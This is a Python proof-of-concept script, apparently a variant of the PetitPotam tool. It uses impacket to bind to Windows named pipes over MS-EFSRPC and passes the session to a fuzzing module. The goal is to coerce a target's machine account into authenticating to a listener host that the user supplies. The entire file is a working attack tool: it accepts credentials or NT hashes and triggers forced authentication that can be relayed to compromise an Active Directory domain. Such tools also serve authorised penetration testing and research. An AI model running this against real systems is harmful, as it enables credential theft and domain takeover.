#!/usr/bin/env python
# 
# Author: GILLES Lionel aka topotam (@topotam77)
# 
# Greetz : grenadine(@Greynardine), skar(@__skar), didakt(@inf0sec1), plissken, pixis(@HackAndDo)
# "Most of" the code stolen from dementor.py from @3xocyte ;)


import sys
import argparse


from lib.module import EFSRfuzz
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.uuid import uuidtup_to_bin



show_banner = '''
                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

'''

class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost, targetIp):
        binding_params = {
            'lsarpc': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'efsr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % target,
                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
            },
            'samr': {
                'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'lsass': {
                'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'netlogon': {
                'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % target,
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        #dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print("[-] Connecting to %s" % binding_params[pipe]['stringBinding'])
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))  
            #sys.exit()
            return
        print("[+] Connected!")
        print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e)) 
            #sys.exit()
            return
        print("[+] Successfully bound!")
        return dce
        
    def fuzz_EfsMethod(self, dce, listener):
        print("[+] In fuzzing mode!")
        EFSRfuzz.fuzz_EFSRMethod(dce,listener)

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')

    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all')
    parser.add_argument('listener', help='ip address or hostname of listener')
    parser.add_argument('target', help='ip address or hostname of target')

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    print(show_banner)

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")
    
    plop = CoerceAuth()
    
    if options.pipe == "all":
        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
    else:
        all_pipes = [options.pipe]
    
    for all_pipe in all_pipes:
        print("Trying pipe", all_pipe)
        dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
        if dce is not None:
            plop.fuzz_EfsMethod(dce, options.listener)
            dce.disconnect()
    sys.exit()   
             
if __name__ == '__main__':
    main()
